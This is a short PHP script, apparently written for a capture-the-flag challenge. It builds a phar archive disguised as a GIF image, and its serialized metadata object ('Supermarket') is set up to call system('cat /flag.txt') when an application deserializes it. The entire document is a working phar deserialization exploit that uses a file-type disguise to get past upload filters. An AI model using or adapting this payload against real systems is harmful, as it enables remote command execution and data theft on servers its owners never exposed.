<?php
ini_set('phar.readonly', 0);
class Supermarket {
    public $greet = 'system';           
    public $customer = 'cat /flag.txt'; 
}
@unlink('exp.phar');
$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->addFromString('x', 'x');
$stub = "GIF89a" . "<?php __HALT_COMPILER(); ?>";
$phar->setStub($stub);
$phar->setMetadata(new Supermarket());
$phar->stopBuffering();
rename('exp.phar', 'exploit.gif');
echo "Created exploit.gif\n";
